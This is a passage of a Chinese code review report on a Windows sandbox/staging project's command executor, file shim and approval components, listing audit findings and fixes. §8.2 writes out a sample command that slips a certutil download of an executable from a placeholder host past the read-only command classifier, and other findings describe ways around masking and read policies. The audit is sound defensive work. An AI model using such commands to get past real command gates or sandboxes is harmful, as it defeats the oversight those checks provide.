5. **环境变量改名（`WINSTAGE_*` → `DSH_*`）的 legacy 回退只覆盖了读取侧。**
   `ws_util.c` 对 `DSH_STAGE_ROOT/DSH_SHIM_CONFIG/DSH_SHIM_LOG/DSH_AUDIT_LOG` 都做了“新名优先、旧名回退”；`ws_entry.c` 对 `DSH_REGSTAGE_SESSION_DIR` 也做了回退。但 `ws_proc.c::ws_env_with_contract()` 重建子进程环境块时只写入新名（这是对的，因为读取侧已回退）；如果仓库外还有调用方只设置旧名、且不经过 `ws_config_from_env()`，需要确认其注入路径仍能命中。当前仓库内没有发现这种调用方。

### 6.3 工具自身的问题

- 本次 `code_search` 3 次因正则未转义失败（`apply(options|selection|paths`、`fwpmFilterAdd0(handle`）。
- 2 次 `code_comment` 因参数 JSON 未正确转义失败；其中一条正是 `audit.ts` 的多评论批次，但该批评论后来通过其他调用落盘。
- 这些失败不改变已完成文件的结论，但意味着**个别本应产生的评论可能缺失**；`completed_with_errors` 状态应如实保留。

---

## 7. 附件

| 文件 | 内容 |
|---|---|
| `.lead/ocr/scan-full.json` | 原始完整结果（45.6 MB，1,169 条评论 + summary + tool_calls） |
| `.lead/ocr/comments.md` | 按严重度/文件排序的全部评论（Markdown） |
| `.lead/ocr/criticals.md` | 20 条 critical 的完整正文 + 建议代码 |
| `.lead/ocr/triage.md` | 按包/子系统统计与全部 critical+high 压缩清单 |
| `.lead/ocr/core-smoke.json` | 单文件冒烟结果（连通性验证） |
| `.lead/ocr/split-scan.json` | 2026-11-16 拆分补扫原始结果（36 切片 / 151 条） |
| `.lead/ocr/split-findings.md` | 拆分补扫结果（行号已映射回原始文件） |
| `.lead/ocr/split-manifest.json` | 切片 → 原始文件/起止行映射表 |

> `ocr review --commit HEAD` 的中间会话因超时被取消，未生成 `commit-r48.json`；R48 的补审结论见 §6.2（人工审阅）。

复现命令（key 仅放进程环境）：

```powershell
$env:DEEPSEEK_API_KEY = '<key>'
ocr scan --format json --output .lead/ocr/scan-full.json --audience agent
```

---

## 8. 2026-11-16 追加：`too_large` 文件拆分补审

### 8.1 方法

7 个未覆盖文件按“连续行切片”拆成 36 个片段（每个约 700–1,000 行，尽量切在 `}`/`;`/`)`/`,` 后的空行处，减少函数中途截断），放在一个临时 git 仓库的 `ocr-chunks/` 下；该仓库由 `git archive HEAD` 导出，**原始完整文件仍保留在原路径**，供 OCR 的 `file_read`/`code_search` 查阅上下文。扫描命令：

```powershell
ocr scan --repo <temp-repo> --path ocr-chunks `
  --exclude 'ocr-chunks/MANIFEST.json' `
  --format json --output .lead/ocr/split-scan.json --audience agent `
  --background "这些文件是 7 个超大原文件的连续行切片；原始完整文件在仓库原路径，可用 file_read/code_search 查阅；切片边界导致的缺 import/缺括号属预期，不要报。"
```

| 项 | 值 |
|---|---|
| 切片数 / 原文件 | 36 / 7 |
| 耗时 | 27m13s |
| tokens | 9,023,089（input 7,964,620 / output 1,058,469） |
| 结果 | success，0 次工具失败 |
| 评论 | 151 条：critical 1 / high 36 / medium 70 / low 44 |

按原文件：`executor.ts` 36、`workspace.ts` 26、`ws_file.c` 24、`client.ts` 20、`registry-stage.ts` 16、`shell-executor.ts` 15、`staging-fs.ts` 14。

**行号映射**：评论行号已按切片起始行还原为原文件行号（`original = chunk.start + chunk_line - 1`）；`split-findings.md` 里同时保留切片内行号，便于回查。

**局限**：切片会切断类成员、跨函数数据流和类型上下文；跨切片的整体不变量（例如“这个字段只在这里写、只在别处读”）可能漏看。下面的“已复核”项是回读原文件确认过的；其余 36 条 high 是切片内可见、但未逐条做整文件验证。

### 8.2 Critical（补扫新增 1 条）

**`packages/win/src/executor.ts:5002`：命令位上的字面解释器被无条件跳过，载荷里的未登记程序不被扫描。**

```ts
if (WRITE_VERBS.includes(token) || INTERPRETER_COMMANDS.includes(token)) continue
```

`INTERPRETER_COMMANDS` 包含 `cmd`/`cmd.exe`/`powershell`/`bash` 等。命令位扫描只检查分隔符（`&`/`|`/`;`/换行）后的第一个 token；遇到 `cmd` 就 `continue`，**不会把 `/c` 之后的载荷当作新的命令位**。因此：

```bat
echo ok & cmd /c certutil -urlcache -f http://x/a.exe out.exe
```

- `echo` 计入只读；
- `cmd` 在命令位被 `INTERPRETER_COMMANDS` 跳过；
- `certutil` 既不在 `WRITE_VERBS` 也不在 `READ_ONLY_EXES`，且它前面是 `/c` 不是分隔符 ⇒ 不会被检查；
- 结果整条被判 `READ_ONLY`。在降级档（无 shim）里，`read-only` 是**一票放行**，`certutil` 会真实落盘。

这不是新问题：同一段代码在 `:4968` 已经修过 `cmd /c ... & %comspec% /c certutil ...`（把 `%comspec%` 判 indeterminate），在 `:4822` 也明确“PowerShell/bash 换行切分、`cmd` 不切”。漏掉的是**字面 `cmd /c` 载荷**。

**修复建议**：命令位遇到解释器时，不要直接 `continue`；对 `cmd /c`/`cmd /k` 的载荷继续按同一套命令位/未知程序规则扫描（或把载荷中出现的未登记程序判 `INDETERMINATE`）。若担心误伤，可只对 `cmd` 的 `/c`、`/k` 做最小展开。

### 8.3 已回读源码复核的 high（15 条）

| 位置 | 问题 | 复核 |
|---|---|---|
| `packages/win/src/executor.ts:352` | `JOBOBJECT_BASIC_LIMIT_INFORMATION` 在 x64 下的偏移错 4 字节：`ActiveProcessLimit` 应为 40（代码 36）、`Affinity` 48（40）、`PriorityClass` 56（48）。设置 activeProcessLimit 会覆盖 `MaximumWorkingSetSize` 高 4 字节 | **确认**。默认不设该选项，但显式传 `activeProcessLimit`/`affinity` 时 Job 限制被写坏 |
| `packages/win/src/executor.ts:1115` | 回读验证只匹配 `type===0` 且 SID 相同的 ACE，不校验 rights 是否包含写权限；残留只读 ACE 会被当成授权成功 | **确认**。与“测不到就不算修好”的 fail-closed 口径冲突 |
| `packages/win/src/executor.ts:1463` | `after.ok===false` 时 `remaining=[...failed]`；若 `failed` 为空（所有 `/remove:g` 返回 ok），`remaining` 为空 ⇒ `repaired=true`，但撤销后的回读根本没成功 | **确认**。失败回读被当成“已修复” |
| `packages/win/src/executor.ts:3018` | `collectWithTimeout` 只 `handle.unref()`，不 `clearTimeout`；子进程先完成时定时器仍会在超时点执行 `terminate(124)`，可能杀掉同一 Job 里后续启动的进程 | **确认** |
| `packages/win/src/executor.ts:4156` | T1 分支 `collectChild` 抛错时只把结果替换成 `exitCode=127`，不调用 `terminate()`，也不清理 Job；`timedOut` 仍为 false | **确认**。子进程/Job 可能残留 |
| `packages/win/src/executor.ts:7023` | `launch()` 只 `this.tracked.delete(outcome.pid)`，全文件没有 `add`；`terminateAll()` 遍历的始终是空集 | **确认**。长跑注入器无法被统一终止 |
| `packages/win/shim/src/ws_file.c:1731` | `ws_nt_create_write_intent` 的 disposition 只认 0/2/4/5，漏了 `FILE_OPEN_IF`(3)；该 disposition 在文件不存在时会创建，却按读意图放行 | **确认**。与函数上方“maybe-create 必须 fail closed”的注释矛盾 |
| `packages/win/shim/src/ws_file.c:4334` | `NtQueryAttributesFile`/`NtQueryFullAttributesFile` 经 `ws_stat_resolve` 解析overlay，全程没有 `ws_mask_decide_read`；被遮蔽路径的存在性/属性仍可见 | **确认**（属性面信息泄露，不是内容读） |
| `packages/win/shim/src/ws_file.c:3440` | `CopyFileW(failIfExists)` 只用 `ws_file_exists(normDst)` 查真实路径；overlay 里已有暂存副本、真实路径不存在时不会报 `ERROR_FILE_EXISTS`，而是覆盖暂存副本 | **确认** |
| `packages/win/src/workspace.ts:4199` | `freezeIfNeeded` 只看 `diffEntries()`；只有 `hostOperations`（无文件变化）时直接返回 `no-net-change`，而 `freezeCandidate()` 本身是支持 hostOperations 的 | **确认**。仅宿主操作的候选永远不会被冻结，审批面看不到 |
| `packages/win/src/workspace.ts:2447` | 陈旧锁清理先按 `mtime > 120s` 删锁，再看 pid 是否存活；注释承诺“先看 pid，再退回 mtime”。仍在运行且 apply 超过 2 分钟的持锁者会被误删 | **确认** |
| `packages/win/dsh-plugin/staging-fs.ts:697` | 单次替换分支把 `newString` 直接传给 `String.replace`；`$&`、`` $` ``、`$'`、`$1`… 会被当成替换模式，用户写入的 `$&` 会变成“匹配到的旧文本” | **确认** |
| `packages/win/dsh-plugin/staging-fs.ts:2698` | `streamText` 的异工作区分支直接返回 `foreignStagedView` 的文本，未调用 `guardMaskedRead`；其他读入口（`:2674`/`:2721`/`:2759`）都有守卫 | **确认**。异工作区 + 遮蔽路径 + 流式读可绕过读策略 |
| `packages/win/dsh-plugin/shell-executor.ts:1948` | `mismatched = requestedMode !== 'workspace-write'` 把更窄的 `read-only` 也当成“更宽”；请求只读时仍以 `workspace-write` 执行，实际可写 | **确认**。与注释“请求更宽只会得到更窄”相反 |
| `packages/win/dsh-plugin/client.ts:2292` | `approveCommandLine` 用 `"${path}"` 直接拼命令；文件名含双引号或 `$(` 会破坏参数解析，可能批准非预期路径 | **确认**。命令解析层注入，不是 shell 注入 |

### 8.4 其余 high 主题（未逐条整文件复核）

- **executor.ts**：`$a=cmd` 无空格赋值在换行后被当表达式跳过（`:4958`）；`& (echo hi & certutil …)` 只检查括号内第一个标识符（`:4977`）；`tracked` 从不 add（`:7023`）；T1S/T0 路径的超时/终止同源问题。
- **ws_file.c**：`ws_CloseHandle` 先 `ws_cow_detach` 再调原 API，失败也不恢复登记（`:1091`）；`NtSetFileLink` 提前返回不填 `IoStatusBlock`（`:1946`）；读穿透回落用 overlay 路径做 hardlink alias 检查（`:2920`）；`Y:relative` 驱动器相对路径被当绝对路径映射（`:229`）。
- **workspace.ts**：备份恢复失败被吞、错误信息不含备份路径（`:627`）；外部目录删除不清理子条目（`:1335`）；撤销“新建目录 + 目录内文件”候选必冲突（`:2247`）。
- **staging-fs.ts**：回滚清单误删并发方创建的目录（`:1643`）；`currentOf` 失败后 `undefined` 被当字面量 `"undefined"`（`:2186`）。
- **client.ts**：`tick` 跨 `await` 读闭包 `sessionId`（`:1360`）；`trustLine` 不返回 `text`，渲染处 `trust.text` 永远 undefined（`:2093`）；`setEnabled` 的 `undefined` 未判失败（`:3256`）。
- **registry-stage.ts**：陈旧锁先删后验（`:2577`）；WAL 撕裂尾巴截断丢字节（`:2695`）；`readBaselineFresh` 无 try/catch（`:3382`）；`(opened?.status ?? opened) >>> 0` 把 null 当成功（`:3623`）；`dataHex` 非字符串被写成空数据（`:3646`）；HARD_DENY 记录仍做 hive 检查（`:3790`）。
- **shell-executor.ts**：`currentSpec` 实例字段并发覆盖（`:1904`）。

完整 151 条见 [`.lead/ocr/split-findings.md`](.lead/ocr/split-findings.md)。

### 8.5 覆盖结论

7 个原 `too_large` 文件现在有了**切片级**覆盖（151 条），其中 1 条 P0 和 15 条 high 已回读原文件确认。但它们仍不是“整文件审查”：切片边界、跨函数不变量、类型/编译上下文都可能漏看。若要把这 7 个文件做到与其余 359 个文件同等置信度，建议按模块（而不是按行数）重审：`executor.ts` 的启动器/T0/T1/T2/dispose 四段、`workspace.ts` 的 Store/逻辑视图/候选三段、`ws_file.c` 的 CreateFile/Copy/Move/Attribute 四族。

---

## 9. 修复进展（2026-11-16）

P0 全部 5 项已修复；P1 批次（执行器 Job 偏移/超时、锁顺序、hostOperations 冻结、staging 替换/遮蔽、WFP 错误码、registry 数据完整性、shim 容量与越界读、Linux 能力/探针/cgroup/pending-store、证据脚本等）已修复并跑过定向套件。最终 `verify.cmd`（58 个离线套件）**ALL PASS**，`pnpm win:verify` PASS，shim 重建 0 warnings、closed-loop 30/30。完整变更、测试读数与**未修清单**见 [FIXES-2026-11-16.md](FIXES-2026-11-16.md)。

特别注意一条**已尝试但回退**的修复：`ws_file.c` 的 NtQueryAttributesFile 遮蔽检查会让 PowerShell 载体 `StackOverflowException`（closed-loop E8 0xC00000FD），已回退；该 finding 仍未修复，报告 §3 中仍按“未修”对待。
